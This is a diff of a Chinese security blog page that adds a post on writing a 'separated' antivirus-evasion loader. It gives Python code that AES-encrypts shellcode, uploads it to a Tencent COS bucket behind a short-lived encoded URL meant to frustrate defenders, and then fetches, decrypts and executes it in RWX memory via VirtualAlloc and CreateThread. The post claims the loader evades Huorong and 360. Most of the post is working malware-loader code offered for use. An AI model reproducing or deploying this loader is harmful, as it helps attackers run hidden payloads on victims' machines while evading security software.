@@ -6,15 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Archives | Solkatt的小窝</title>
+  <title>cos远程加载器编写 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/archives/page/2/index.html">
+  <meta name="description" content="背景在免杀的过程中，分离免杀因为其加载器和shellcode分离的原因让特征不明显，分离免杀成为了现在的主流免杀方式了。 思路两个脚本，一个负责预处理，一个负责加载。 预处理加密（shellcode，url，密钥），文件上传并返回下载链接，随机生成加密key 1.读取配置文件，获取secret_id，secret_key，存储桶地址 2.随机生成key 3.使用生成的key将shellcode加密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cos远程加载器编写">
+<meta property="og:url" content="https://example.com/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="背景在免杀的过程中，分离免杀因为其加载器和shellcode分离的原因让特征不明显，分离免杀成为了现在的主流免杀方式了。 思路两个脚本，一个负责预处理，一个负责加载。 预处理加密（shellcode，url，密钥），文件上传并返回下载链接，随机生成加密key 1.读取配置文件，获取secret_id，secret_key，存储桶地址 2.随机生成key 3.使用生成的key将shellcode加密">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618231334256.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618231506774.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618232453075.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618233459964.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618233539716.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618233552580.png">
+<meta property="article:published_time" content="2022-06-18T14:57:49.000Z">
+<meta property="article:modified_time" content="2022-06-18T15:41:01.897Z">
 <meta property="article:author" content="Solkatt">
+<meta property="article:tag" content="萌新免杀的故事">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618231334256.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,339 +154,197 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-cos远程加载器编写" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      cos远程加载器编写
+    </h1>
+  
+
+        
+        <a href="/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/" class="archive-article-date">
+  	<time datetime="2022-06-18T14:57:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-18</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在免杀的过程中，分离免杀因为其加载器和shellcode分离的原因让特征不明显，分离免杀成为了现在的主流免杀方式了。</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>两个脚本，一个负责预处理，一个负责加载。</p>
+<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>加密（shellcode，url，密钥），文件上传并返回下载链接，随机生成加密key</p>
+<p>1.读取配置文件，获取secret_id，secret_key，存储桶地址</p>
+<p>2.随机生成key</p>
+<p>3.使用生成的key将shellcode加密</p>
+<p>4.将加密后的shellcode存储到本地txt文件中</p>
+<p>4.使用oss的公开api将txt上传到存储桶中，并且返回随机生成的url</p>
+<p>5.将url与key写入另一个json文件。</p>
+<h2 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h2><p>访问下载链接并提取shellode，解密</p>
+<p>1.获取key和url</p>
+<p>2.解密url</p>
+<p>3.访问url 将加密后的shellcode拉到本地</p>
+<p>4.使用key解密shellcode</p>
+<p>5.将shellcode加载进内存执行</p>
+<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><h2 id="预处理-1"><a href="#预处理-1" class="headerlink" title="预处理"></a>预处理</h2><p>首先我们需要去创建一个存储筒，我用的是腾讯云cos存储筒。因为使用的是python语言，所以我们需要按照官方上的sdk教程去调用对象存储功能。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618231334256.png" alt="image-20220618231334256"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618231506774.png" alt="image-20220618231506774"></p>
+<p>预处理由三个部分组成，分别为<code>读取存储筒文件</code>，<code>加密手段</code>，<code>上传文件</code>三个部分。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConfig</span>():</span></span><br><span class="line">    <span class="comment"># 获取配置文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.json&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> read:</span><br><span class="line">        config = read.read()</span><br><span class="line">        read.close()</span><br><span class="line">    config = json.loads(config)</span><br><span class="line">    secret_id = config[<span class="string">&#x27;secret_id&#x27;</span>]</span><br><span class="line">    secret_key = config[<span class="string">&#x27;secret_key&#x27;</span>]</span><br><span class="line">    url = config[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> secret_id, secret_key, url</span><br></pre></td></tr></table></figure>
+
+<p>加密我采用的是很简单的AES ECB加密。该加密只需要使用一个公钥便可以加解密我们的内容，方便快捷。但是我们需要注意的是，每一次运行都随机生成我们的公钥。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIv</span>():</span></span><br><span class="line">    all_char = <span class="string">&#x27;0123456789qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJIKOLP&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        password += random.choice(<span class="built_in">list</span>(all_char))</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ecbEncrypt</span>(<span class="params">password, text</span>):</span></span><br><span class="line">    password = password  <span class="comment"># 秘钥，b就是表示为bytes类型</span></span><br><span class="line">    text = text  <span class="comment"># 需要加密的内容，bytes类型</span></span><br><span class="line">    aes = AES.new(password, AES.MODE_ECB)  <span class="comment"># 创建一个aes对象</span></span><br><span class="line">    <span class="comment"># AES.MODE_ECB 表示模式是ECB模式</span></span><br><span class="line">    en_text = aes.encrypt(text)  <span class="comment"># 加密明文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>, en_text)  <span class="comment"># 加密明文，bytes类型</span></span><br><span class="line">    <span class="keyword">return</span> en_text</span><br></pre></td></tr></table></figure>
+
+<p>上传文件使用的就是官方上简单上传的api，首先把加密后的shellcdoe写成一个名为<code>123.txt</code>文件，调用api上传该文件至筒中。随后返回一个下载该文件的url。这里可以把该url有效期设置为一小时，防止以后蓝队查到了，但是已经没有效果了。同时对返回回来的url也做了一定程度的加密。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">miwen</span>):</span></span><br><span class="line">    <span class="comment"># 写入文件,并且上传</span></span><br><span class="line">    file_name = <span class="string">&quot;123.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> write:</span><br><span class="line">        write.write(miwen)</span><br><span class="line">        write.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> read:</span><br><span class="line">        response = client.put_object(</span><br><span class="line">            Bucket=<span class="string">&#x27;cosjiazai-..........&#x27;</span>,  <span class="comment"># Bucket 由 BucketName-APPID 组成</span></span><br><span class="line">            Body=read,</span><br><span class="line">            Key=file_name,</span><br><span class="line">            StorageClass=<span class="string">&#x27;STANDARD&#x27;</span>,</span><br><span class="line">            ContentType=<span class="string">&#x27;text/html; charset=utf-8&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># print(response[&#x27;ETag&#x27;])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成下载URL</span></span><br><span class="line">        url = client.get_presigned_url(</span><br><span class="line">            Method=<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            Bucket=<span class="string">&#x27;cosjiazai-..................&#x27;</span>,</span><br><span class="line">            Key=<span class="string">&#x27;123.txt&#x27;</span>,</span><br><span class="line">            Expired=<span class="number">3600</span>  <span class="comment"># 一小时后过期</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对临时链接进行base32加密</span></span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        url = url.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        url = base64.b32encode(url)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行该py文件后，可以见到已经上传至筒中。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618232453075.png" alt="image-20220618232453075"></p>
+<p>同时，预处理文件也会把加密后的url和key写入另外一个json文件用来让加载器进行读写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成存放密钥与url地址的文件</span></span><br><span class="line">   target_dict = &#123;<span class="string">&#x27;key&#x27;</span>:<span class="built_in">str</span>(password),<span class="string">&#x27;url&#x27;</span>:<span class="built_in">str</span>(download_url)&#125;</span><br><span class="line">   target=json.dumps(target_dict)</span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;target.json&#x27;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fwrite:</span><br><span class="line">       fwrite.write(target)</span><br><span class="line">       fwrite.close()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="加载器-1"><a href="#加载器-1" class="headerlink" title="加载器"></a>加载器</h2><p>加载器的功能依然有<code>加载配置文件</code>，<code>解密过程</code>,<code>加载进内存</code>的手段</p>
+<p>加载配置文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinfo</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;target.json&#x27;</span>, <span class="string">&quot;r+&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fread:</span><br><span class="line">        read = fread.read()</span><br><span class="line">        fread.close()</span><br><span class="line">        <span class="keyword">return</span> read</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">target=getinfo()</span><br><span class="line">    target_dict = json.loads(target)</span><br><span class="line">    password = target_dict[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    url = target_dict[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    password = password.replace(<span class="string">&#x27;b\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    password = password.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    password=password.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    url = url.replace(<span class="string">&#x27;b\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    url = url.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    url = base64.b32decode(url)</span><br><span class="line">    url = url.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#这里完全是因为不知道更好的方式来转换所以才用了这么多方法。</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>解密过程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ecbDncrypt</span>(<span class="params">password, text</span>):</span></span><br><span class="line">    password = password  <span class="comment"># 秘钥，b就是表示为bytes类型</span></span><br><span class="line">    en_text = text  <span class="comment"># 需要解密的内容，bytes类型</span></span><br><span class="line">    aes = AES.new(password, AES.MODE_ECB)  <span class="comment"># 创建一个aes对象</span></span><br><span class="line">    den_text = aes.decrypt(en_text)  <span class="comment"># 解密密文</span></span><br><span class="line">    <span class="keyword">return</span> den_text</span><br></pre></td></tr></table></figure>
+
+<p>加载进内存</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellCodeLoad</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64  <span class="comment"># 指定virtualloc函数的返回值类型</span></span><br><span class="line">    <span class="comment"># 定义virtualloc函数,为什么它的参数fiallocationtype要指定为0x3000，它是0x1000和0x2000给它加起来。即又申请了到物理内存，又申请到虚拟内存。</span></span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    <span class="comment"># 把shell写入缓冲区</span></span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    <span class="comment"># 调用rtlmovememort函数，把shellcode从缓冲区移动到申请的虚拟内存</span></span><br><span class="line">    ctypes.windll.kernel32.RtlCopyMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    <span class="comment"># 制造线程，第三个参数即我们需要调用的线程函数地址</span></span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_uint64(ptr),</span><br><span class="line">                                                 ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p>物理机上是安装的火绒，虚拟机上是安装的360。都可以全过。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618233459964.png" alt="image-20220618233459964"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618233539716.png" alt="image-20220618233539716"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220618233552580.png" alt="image-20220618233552580"></p>
+<h1 id="可以改进的方向"><a href="#可以改进的方向" class="headerlink" title="可以改进的方向"></a>可以改进的方向</h1><ol>
+<li>加密使用的是很简单的AES ECB加密，可以使用复杂一些的加密。</li>
+<li>可以让在执行预处理的阶段，使用pyinstaller来自动编译加载器，避免手动用命令行来做。</li>
+<li>可以把加载器改为接受传参式。这样就可以避免要考两个文件上别人主机的尴尬情况。</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/" class="archive-article-date">
-  	<time datetime="2022-03-09T13:19:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/">浅谈UAC及绕过</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-03-06T09:10:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/">域林渗透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="archive-article-date">
-  	<time datetime="2022-03-06T07:20:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">域渗透--pth与委派攻击</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="archive-article-date">
-  	<time datetime="2022-03-03T11:09:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">elitecms代码审计</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" class="archive-article-date">
-  	<time datetime="2022-02-28T08:06:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">内网渗透工具</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/" class="archive-article-date">
-  	<time datetime="2022-02-27T13:53:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-27</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/06/14/Syscall/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Syscall</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/">Kerberos协议</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-02-25T02:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">Raven2靶机渗透</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2022-02-24T01:00:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Liunx提权总结</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-02-21T08:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
